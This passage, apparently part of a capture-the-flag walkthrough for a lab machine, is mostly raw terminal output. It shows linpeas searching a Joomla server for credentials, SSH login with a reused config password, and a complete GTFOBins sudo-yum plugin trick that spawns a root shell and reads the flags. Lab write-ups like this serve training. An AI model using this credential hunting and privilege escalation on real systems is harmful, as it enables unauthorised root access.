+/var/www/html/administrator/components/com_languages/models/installed.php:			->where('client_id=' . (int) $client);
+/var/www/html/administrator/components/com_languages/models/installed.php:		// For client_id = 1 do we need to check language table also?
+/var/www/html/administrator/components/com_languages/models/language.php:	protected function cleanCache($group = null, $client_id = 0)
+/var/www/html/administrator/components/com_languages/models/languages.php:	protected function cleanCache($group = null, $client_id = 0)
+/var/www/html/administrator/components/com_languages/views/installed/view.html.php:			if ($this->state->get('client_id', 0) == 1)
+/var/www/html/administrator/components/com_languages/views/installed/view.html.php:		if ((int) $this->state->get('client_id') === 1)
+/var/www/html/administrator/components/com_login/models/login.php:				->where('m.module =' . $db->quote($module) . ' AND m.client_id = 1')
+/var/www/html/administrator/components/com_login/models/login.php:			'secretkey' => $input->$method->get('secretkey', '', 'RAW'),
+/var/www/html/administrator/components/com_menus/controllers/item.php:			$append   = '&client_id=' . $clientId . $append;
+/var/www/html/administrator/components/com_menus/helpers/menus.php:				$query->where('client_id = ' . (int) $clientId);
+/var/www/html/administrator/components/com_menus/helpers/menus.php:			$query->where('a.client_id = ' . (int) $clientId);
+/var/www/html/administrator/components/com_menus/models/item.php:			$data['client_id'] = $menuType->client_id;
+/var/www/html/administrator/components/com_menus/models/item.php:			$table->client_id = $this->getState('item.client_id');
+/var/www/html/administrator/components/com_menus/models/item.php:			->where('a.client_id = ' . (int) $this->getState('item.client_id'))
+/var/www/html/administrator/components/com_menus/models/item.php:		if ($table->get('client_id') == 0 && JLanguageAssociations::isEnabled())
+/var/www/html/administrator/components/com_menus/models/item.php:		if ($this->getState('item.client_id') == 0 && JLanguageAssociations::isEnabled())
+/var/www/html/administrator/components/com_menus/models/item.php:		if ($this->getState('item.client_id') == 1)
+/var/www/html/administrator/components/com_menus/models/item.php:	protected function cleanCache($group = null, $client_id = 0)
+/var/www/html/administrator/components/com_menus/models/items.php:				->where('client_id = ' . (int) $this->getState('filter.client_id'))
+/var/www/html/administrator/components/com_menus/models/items.php:			->where('a.client_id = ' . (int) $this->getState('filter.client_id'));
+/var/www/html/administrator/components/com_menus/models/menu.php:	protected function cleanCache($group = null, $client_id = 0)
+/var/www/html/administrator/components/com_menus/models/menus.php:			->where('e.client_id = ' . (int) $this->getState('client_id'));
+/var/www/html/administrator/components/com_menus/models/menus.php:		$query->where('a.client_id = ' . (int) $this->getState('client_id'));
+/var/www/html/administrator/components/com_menus/views/items/tmpl/default.php:				<?php if ($this->state->get('filter.client_id') == 0) : ?>
+/var/www/html/administrator/components/com_menus/views/items/view.html.php:		if ($this->state->get('filter.client_id') == 0)
+/var/www/html/administrator/components/com_menus/views/menutypes/view.html.php:		if ($this->get('state')->get('client_id') == 1)
+/var/www/html/administrator/components/com_modules/helpers/html/modules.php:			->where($db->quoteName('client_id') . ' = ' . (int) $clientId)
+/var/www/html/administrator/components/com_modules/helpers/modules.php:			->where($db->quoteName('client_id') . ' = ' . (int) $clientId)
+/var/www/html/administrator/components/com_modules/helpers/modules.php:			->where('client_id = ' . (int) $clientId)
+/var/www/html/administrator/components/com_modules/helpers/modules.php:			->where('e.client_id = ' . (int) $clientId)
+
+[+] Finding 'username' string inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
+/etc/libuser.conf:LU_USERNAME = %n
+/tmp/linpeas.sh:    for f in $tomcat; do grep "username=" "$f" 2>/dev/null | grep "password=" | sed "s,.*,${C}[1;31m&${C}[0m,"; done
+/var/www/html/administrator/components/com_admin/models/forms/profile.xml:		<field name="username" type="text"
+/var/www/html/administrator/components/com_admin/models/profile.php:				|| trim($username) != $username);
+/var/www/html/administrator/components/com_admin/models/profile.php:			$username = $this->loadFormData()->username;
+/var/www/html/administrator/components/com_admin/models/profile.php:		$isUsernameCompliant = $this->getState('user.username.compliant');
+/var/www/html/administrator/components/com_admin/models/profile.php:		$isUsernameCompliant = true;
+/var/www/html/administrator/components/com_joomlaupdate/controllers/update.php:			'username'  => $this->input->post->get('username', '', 'username'),
+/var/www/html/administrator/components/com_joomlaupdate/models/default.php:			'username'  => $config->get('ftp_user'),
+/var/www/html/administrator/components/com_joomlaupdate/models/default.php:		if ($user->username != $username)
+/var/www/html/administrator/components/com_joomlaupdate/views/upload/tmpl/captive.php:			<label for="mod-login-username" class="element-invisible">
+/var/www/html/administrator/components/com_login/models/login.php:			'username' => $input->$method->get('username', '', 'USERNAME'),
+/var/www/html/administrator/components/com_media/views/medialist/tmpl/details.php:	<input type="hidden" name="username" value="" />
+/var/www/html/administrator/components/com_media/views/medialist/tmpl/thumbs.php:		<input type="hidden" name="username" value="" />
+/var/www/html/administrator/components/com_users/models/forms/user.xml:		<field name="username" type="text"
+/var/www/html/administrator/components/com_users/models/users.php:			elseif (stripos($search, 'username:') === 0)
+/var/www/html/administrator/components/com_users/views/users/view.html.php:				'a.username' => JText::_('JGLOBAL_USERNAME'),
+/var/www/html/administrator/language/en-GB/en-GB.com_admin.ini:COM_ADMIN_USER_FIELD_USERNAME_DESC="Enter the login name (Username) for the user."
+/var/www/html/administrator/language/en-GB/en-GB.com_admin.ini:COM_ADMIN_USER_FIELD_USERNAME_LABEL="Login Name"
+/var/www/html/administrator/language/en-GB/en-GB.com_config.ini:COM_CONFIG_FIELD_DATABASE_USERNAME_LABEL="Database Username"
+/var/www/html/administrator/language/en-GB/en-GB.com_config.ini:COM_CONFIG_FIELD_FTP_USERNAME_DESC="The username used to access the FTP server."
+/var/www/html/administrator/language/en-GB/en-GB.com_config.ini:COM_CONFIG_FIELD_FTP_USERNAME_LABEL="FTP Username"
+/var/www/html/administrator/language/en-GB/en-GB.com_config.ini:COM_CONFIG_FIELD_MAIL_SMTP_USERNAME_LABEL="SMTP Username"
+/var/www/html/administrator/language/en-GB/en-GB.com_config.ini:COM_CONFIG_FIELD_PROXY_USERNAME_DESC="The username used to access the Proxy server."
+/var/www/html/administrator/language/en-GB/en-GB.com_config.ini:COM_CONFIG_FIELD_PROXY_USERNAME_LABEL="Proxy Username"
+/var/www/html/administrator/language/en-GB/en-GB.com_joomlaupdate.ini:COM_JOOMLAUPDATE_VIEW_DEFAULT_FTP_USERNAME="FTP Username"
+/var/www/html/administrator/language/en-GB/en-GB.com_users.ini:COM_USERS_CONFIG_FIELD_CHANGEUSERNAME_LABEL="Change Username"
+/var/www/html/administrator/language/en-GB/en-GB.com_users.ini:COM_USERS_HEADING_USERNAME_ASC="Username ascending"
+/var/www/html/administrator/language/en-GB/en-GB.com_users.ini:COM_USERS_HEADING_USERNAME_DESC="Username descending"
+/var/www/html/administrator/language/en-GB/en-GB.com_users.ini:COM_USERS_USER_FIELD_USERNAME_DESC="Enter the login name (Username) for the user."
+/var/www/html/administrator/language/en-GB/en-GB.com_users.ini:COM_USERS_USER_FIELD_USERNAME_LABEL="Login Name"
+/var/www/html/administrator/language/en-GB/en-GB.ini:JGLOBAL_USERNAME="Username"
+/var/www/html/administrator/language/en-GB/en-GB.lib_joomla.ini:JLIB_DATABASE_ERROR_USERNAME_CANNOT_CHANGE="Can't use this username."
+/var/www/html/administrator/language/en-GB/en-GB.lib_joomla.ini:JLIB_DATABASE_ERROR_USERNAME_INUSE="Username in use."
+/var/www/html/administrator/language/en-GB/en-GB.plg_authentication_ldap.ini:PLG_LDAP_FIELD_USERNAME_LABEL="Connect Username"
+/var/www/html/administrator/language/en-GB/en-GB.plg_system_log.ini:PLG_SYSTEM_LOG_FIELD_LOG_USERNAME_LABEL="Log Usernames"
+/var/www/html/administrator/modules/mod_login/tmpl/default.php:						<label for="mod-login-username" class="element-invisible">
+/var/www/html/administrator/templates/isis/html/layouts/joomla/form/field/user.php:	$userName = '';
+/var/www/html/administrator/templates/isis/html/layouts/joomla/form/field/user.php:if ($this->escape($userName) === JText::_('JLIB_FORM_SELECT_USER'))
+/var/www/html/components/com_users/controllers/user.php:			$data['username'] = '';
+/var/www/html/components/com_users/controllers/user.php:		$credentials['username']  = $data['username'];
+/var/www/html/components/com_users/controllers/user.php:		$data['username']  = $input->$method->get('username', '', 'USERNAME');
+/var/www/html/components/com_users/models/profile.php:				|| trim($username) != $username);
+/var/www/html/components/com_users/models/profile.php:		$isUsernameCompliant = $this->getState('user.username.compliant');
+/var/www/html/components/com_users/models/profile.php:		$isUsernameCompliant = true;
+/var/www/html/components/com_users/models/profile.php:		$username = $loadData ? $form->getValue('username') : $this->loadFormData()->username;
+/var/www/html/components/com_users/models/reset.php:			->where($db->quoteName('username') . ' = ' . $db->quote($data['username']));
+/var/www/html/language/en-GB/en-GB.com_users.ini:COM_USERS_DESIRED_USERNAME="Enter your desired username."
+/var/www/html/language/en-GB/en-GB.com_users.ini:COM_USERS_EMAIL_USERNAME_REMINDER_SUBJECT="Your %s username"
+/var/www/html/language/en-GB/en-GB.com_users.ini:COM_USERS_FIELD_RESET_CONFIRM_USERNAME_DESC="Enter your username."
+/var/www/html/language/en-GB/en-GB.com_users.ini:COM_USERS_FIELD_RESET_CONFIRM_USERNAME_LABEL="Username"
+/var/www/html/language/en-GB/en-GB.com_users.ini:COM_USERS_LOGIN_USERNAME_LABEL="Username"
+/var/www/html/language/en-GB/en-GB.com_users.ini:COM_USERS_PROFILE_USERNAME_DESC="Enter your desired username."
+/var/www/html/language/en-GB/en-GB.com_users.ini:COM_USERS_PROFILE_USERNAME_LABEL="Username"
+/var/www/html/language/en-GB/en-GB.com_users.ini:COM_USERS_REGISTER_USERNAME_DESC="Enter your desired username."
+/var/www/html/language/en-GB/en-GB.com_users.ini:COM_USERS_REGISTER_USERNAME_LABEL="Username"
+/var/www/html/language/en-GB/en-GB.ini:JGLOBAL_USERNAME="Username"
+/var/www/html/language/en-GB/en-GB.lib_joomla.ini:JLIB_DATABASE_ERROR_USERNAME_CANNOT_CHANGE="Can't use this username."
+/var/www/html/language/en-GB/en-GB.lib_joomla.ini:JLIB_DATABASE_ERROR_USERNAME_INUSE="Username in use."
+/var/www/html/language/en-GB/en-GB.mod_login.ini:MOD_LOGIN_FORGOT_YOUR_USERNAME="Forgot your username?"
+/var/www/html/language/en-GB/en-GB.mod_login.ini:MOD_LOGIN_VALUE_USERNAME="Username"
+/var/www/html/layouts/joomla/form/field/user.php:	$userName = '';
+/var/www/html/layouts/joomla/form/field/user.php:if ($this->escape($userName) === JText::_('JLIB_FORM_SELECT_USER'))
+/var/www/html/libraries/cms/application/administrator.php:	 * @param   array  $credentials  Array('username' => string, 'password' => string)
+/var/www/html/libraries/cms/application/cms.php:			$options['username'] = $user->get('username');
+/var/www/html/libraries/cms/application/cms.php:		$parameters['username'] = $user->get('username');
+/var/www/html/libraries/cms/application/cms.php:	 * @param   array  $credentials  Array('username' => string, 'password' => string)
+/var/www/html/libraries/cms/application/site.php:	 * @param   array  $credentials  Array('username' => string, 'password' => string)
+/var/www/html/libraries/cms/form/field/user.php:			'userName'  => $name,
+/var/www/html/libraries/fof/dispatcher/dispatcher.php:						'username'	 => $_SERVER['PHP_AUTH_USER'],
+
+[+] Looking for specific hashes inside files - less false positives (limit 70)
+/var/www/html/libraries/joomla/user/helper.php:$2y$10$
+/var/www/html/libraries/vendor/ircmaxell/password-compat/lib/password.php:$2y$04$usesomesillystringfore7hnbRJHxXVLeakoG8K30oukPsA.ztMG
+
+USE PASSWORD FOR SSH LOGIN FROM LINPEAS OUTPUT
+[+] Searching passwords in config PHP files
+	public $password = '###############';
+
+LOGIN VIA SSH
+root@kali:~/tryhackme/dailybugle# ssh jjameson@10.10.251.133
+The authenticity of host '10.10.251.133 (10.10.251.133)' can't be established.
+ECDSA key fingerprint is SHA256:apAdD+3yApa9Kmt7Xum5WFyVFUHZm/dCR/uJyuuCi5g.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '10.10.251.133' (ECDSA) to the list of known hosts.
+jjameson@10.10.251.133's password: 
+Last login: Mon Dec 16 05:14:55 2019 from netwars
+
+GET USER FLAG
+[jjameson@dailybugle ~]$ cat /home/jjameson/user.txt 
+############################
+
+PRIVESC
+[jjameson@dailybugle ~]$ sudo -l
+Matching Defaults entries for jjameson on dailybugle:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset,
+    env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR
+    USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
+    LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
+    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
+    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User jjameson may run the following commands on dailybugle:
+    (ALL) NOPASSWD: /usr/bin/yum
+
+REVIEW GTFOBINS FOR YUM
+https://gtfobins.github.io/gtfobins/yum/
+
+GET ROOT SHELL
+[jjameson@dailybugle ~]$ TF=$(mktemp -d)
+[jjameson@dailybugle ~]$ cat >$TF/x<<EOF
+> [main]
+> plugins=1
+> pluginpath=$TF
+> pluginconfpath=$TF
+> EOF
+[jjameson@dailybugle ~]$ cat >$TF/y.conf<<EOF
+> [main]
+> enabled=1
+> EOF
+[jjameson@dailybugle ~]$ cat >$TF/y.py<<EOF
+> import os
+> import yum
+> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+> requires_api_version='2.1'
+> def init_hook(conduit):
+>   os.execl('/bin/sh','/bin/sh')
+> EOF
+[jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y
+Loaded plugins: y
+No plugin match for: y
+sh-4.2# id
+uid=0(root) gid=0(root) groups=0(root)
+sh-4.2# cat /root/root.txt
+#################################################
+sh-4.2# 
+
+
+
